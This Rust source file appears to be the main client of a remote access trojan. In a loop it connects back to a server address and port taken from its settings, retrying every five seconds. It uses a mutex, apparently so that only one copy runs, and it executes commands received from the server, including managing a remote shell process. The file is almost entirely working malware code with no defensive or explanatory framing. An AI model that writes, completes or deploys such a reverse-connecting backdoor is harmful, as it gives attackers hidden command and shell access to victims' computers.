

use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;
use std::sync::{Arc, Mutex};
use std::thread::sleep;

pub mod features;
pub mod handler;
pub mod service;
pub mod settings;

use handler::handle_command;
use common::buffers::read_buffer;
use rand::{rngs::OsRng, Rng};
use std::process;


fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_connected: Arc<Mutex<bool>>) {
    let mut remote_shell: Option<Child> = None;

    let mut current_path = PathBuf::new();

    let mut secret = [0u8; common::SECRET_LEN];
    OsRng.fill(&mut secret);

    loop {
        let received = read_buffer(&mut read_stream);
        match received {
            Ok(bytes) => {
                let command_str: std::borrow::Cow<'_, str> = String::from_utf8_lossy(&bytes);
                let commands = command_str.trim().split('\n').collect::<Vec<_>>();
                for command in commands {
                    if command == "reconnect" {
                        *is_connected.lock().unwrap() = false;
                        break;
                    }

                    if command == "disconnect" {
                        if let Some(shell) = remote_shell.as_mut() {
                            let _ = shell.kill();
                        }
                        process::exit(1);
                    }

                    handle_command(&mut write_stream, command, &mut remote_shell, &mut current_path);
                }
            }
            Err(_) => {
                println!("Disconnected!");
                if let Some(shell) = remote_shell.as_mut() {
                    let _ = shell.kill();
                }
                *is_connected.lock().unwrap() = false;
                break;  
            }
        }
    }
}


fn main() {
    service::mutex::mutex_lock();
    let is_connected = Arc::new(Mutex::new(false));

    loop {
        let is_connected_clone = is_connected.clone();
        if *is_connected_clone.lock().unwrap() {
            sleep(std::time::Duration::from_secs(5));
            continue;
        }

        std::thread::spawn(move || {
            println!("Connecting to server...");
            let stream = TcpStream::connect(format!("{}:{}", settings::IP, settings::PORT));
            if let Ok(str) = stream {
                *is_connected_clone.lock().unwrap() = true;
                handle_server(str.try_clone().unwrap(), str.try_clone().unwrap(), is_connected_clone);
            };
        });
        sleep(std::time::Duration::from_secs(5));
    }
}